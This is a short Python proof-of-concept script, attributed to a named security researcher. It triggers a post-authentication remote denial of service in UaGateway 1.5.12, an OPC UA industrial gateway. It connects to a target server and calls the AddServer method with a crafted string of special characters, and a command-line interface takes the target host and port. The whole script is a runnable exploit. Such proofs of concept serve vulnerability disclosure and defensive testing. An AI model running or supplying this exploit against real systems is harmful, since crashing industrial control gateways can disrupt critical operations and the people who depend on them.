# Axel '0vercl0k' Souchet - January 2023
import argparse
import asyncio
# pip3 install asyncua
from asyncua import Client, ua


async def trigger(target, port):
    client = Client(url = f'opc.tcp://{target}:{port}')
    await client.connect()
    node = client.get_node('ns=1;s=OpcUaServers.MethodSet')
    trigger = "<hello my dude'\"\x01\x02!#$%&"
    await node.call_method(
        ua.NodeId.from_string('ns=1;s=OpcUaServers.AddServer'),
        trigger, trigger
    )

def main():
    parser = argparse.ArgumentParser("UaGateway 1.5.12 post-auth Remote DoS by Axel '0vercl0k' Souchet of https://doar-e.github.io/")
    parser.add_argument('--port', type = int, default = 48050)
    parser.add_argument('--target', type = str, required = True)
    args = parser.parse_args()
    print('Launching against', args.target)
    asyncio.run(trigger(args.target, args.port))
    print('Done')

if __name__ == '__main__':
    main()